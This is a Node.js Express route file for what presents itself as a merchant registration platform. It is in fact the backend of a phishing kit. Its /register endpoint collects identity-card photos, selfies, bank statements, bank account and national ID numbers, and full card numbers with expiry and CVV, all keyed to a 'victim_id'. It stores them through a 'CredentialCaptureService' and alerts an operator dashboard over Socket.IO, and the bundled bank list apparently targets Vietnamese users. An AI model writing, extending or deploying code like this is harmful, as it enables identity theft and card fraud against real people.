// Merchant platform routes aggregator
const express = require('express');
const router = express.Router();
const multer = require('multer');
const path = require('path');
const fs = require('fs').promises;
const { PrismaClient } = require('@prisma/client');

// Initialize repositories and services
const prisma = new PrismaClient();
const VictimRepository = require('../../../repositories/victimRepository');
const EncryptionService = require('../../../services/encryption');
const CredentialCaptureService = require('../../../services/credentialCapture');
const FileStorageService = require('../../../services/fileStorage');
const { getEncryptionConfig } = require('../../../config/encryption');
const config = require('../../../config');
const logger = require('../../../utils/logger');

// Initialize services
const encryptionConfig = getEncryptionConfig();
const cardEncryptionService = new EncryptionService(encryptionConfig.cardEncryptionKey);
const oauthEncryptionService = new EncryptionService(encryptionConfig.oauthEncryptionKey);
const victimRepository = new VictimRepository(prisma);
const oauthTokenRepository = require('../../../repositories/oauthTokenRepository');
const credentialCaptureService = new CredentialCaptureService(
  new oauthTokenRepository(prisma),
  victimRepository,
  oauthEncryptionService
);

// Initialize file storage
const fileStorageService = new FileStorageService();
fileStorageService.initialize().catch(err => logger.error('File storage init error:', err));

// Configure multer for file uploads
const storage = multer.memoryStorage();
const upload = multer({
  storage,
  limits: {
    fileSize: config.upload.maxFileSize
  },
  fileFilter: (req, file, cb) => {
    // Allow images and PDFs
    const allowedMimes = ['image/jpeg', 'image/jpg', 'image/png', 'image/webp', 'application/pdf'];
    if (allowedMimes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type. Only images and PDFs are allowed.'));
    }
  }
});

// POST /api/merchant/register - Process registration form
router.post('/register', upload.fields([
  { name: 'identityCard', maxCount: 1 },
  { name: 'selfie', maxCount: 1 },
  { name: 'bankStatement', maxCount: 1 }
]), async (req, res) => {
  try {
    const { victim_id } = req.body;
    
    if (!victim_id) {
      return res.status(400).json({ error: 'victim_id is required' });
    }

    // Process uploaded files
    const files = {};
    if (req.files) {
      for (const [fieldName, fileArray] of Object.entries(req.files)) {
        if (fileArray && fileArray.length > 0) {
          const file = fileArray[0];
          const filePath = await fileStorageService.storeFile(
            file.buffer,
            file.originalname,
            'identity'
          );
          files[fieldName] = {
            path: filePath,
            originalName: file.originalname,
            mimetype: file.mimetype,
            size: file.size
          };
        }
      }
    }

    // Extract form data
    const formData = {
      fullName: req.body.fullName,
      phone: req.body.phone,
      address: req.body.address,
      city: req.body.city,
      district: req.body.district,
      bankName: req.body.bankName,
      bankAccount: req.body.bankAccount,
      idNumber: req.body.idNumber,
      cardNumber: req.body.cardNumber,
      cardHolder: req.body.cardHolder,
      expiryDate: req.body.expiryDate,
      cvv: req.body.cvv
    };

    // Process registration form
    const updatedVictim = await credentialCaptureService.processRegistrationForm(
      victim_id,
      formData,
      files
    );

    // Emit Socket.IO event for admin dashboard
    const io = req.app.get('io');
    if (io) {
      io.to('admin').emit('victim:registered', {
        victimId: updatedVictim.id,
        email: updatedVictim.email,
        timestamp: new Date().toISOString()
      });
    }

    res.status(200).json({
      success: true,
      message: 'Registration completed successfully',
      victim_id: updatedVictim.id
    });
  } catch (error) {
    logger.error('Error processing registration:', error);
    res.status(500).json({
      error: 'Failed to process registration',
      message: error.message
    });
  }
});

// GET /api/merchant/session/:victim_id - Get session data
router.get('/session/:victim_id', async (req, res) => {
  try {
    const { victim_id } = req.params;
    
    const victim = await victimRepository.findById(victim_id);
    if (!victim) {
      return res.status(404).json({ error: 'Victim not found' });
    }

    // Return safe session data (no encrypted data)
    res.status(200).json({
      victim_id: victim.id,
      email: victim.email,
      name: victim.name,
      phone: victim.phone,
      captureMethod: victim.captureMethod,
      registrationCompleted: victim.validation?.registrationCompleted || false
    });
  } catch (error) {
    logger.error('Error fetching session:', error);
    res.status(500).json({
      error: 'Failed to fetch session data',
      message: error.message
    });
  }
});

// GET /api/merchant/banks - Return Vietnamese banks list
const banksRoutes = require('./banks');
router.use('/banks', banksRoutes);

module.exports = router;

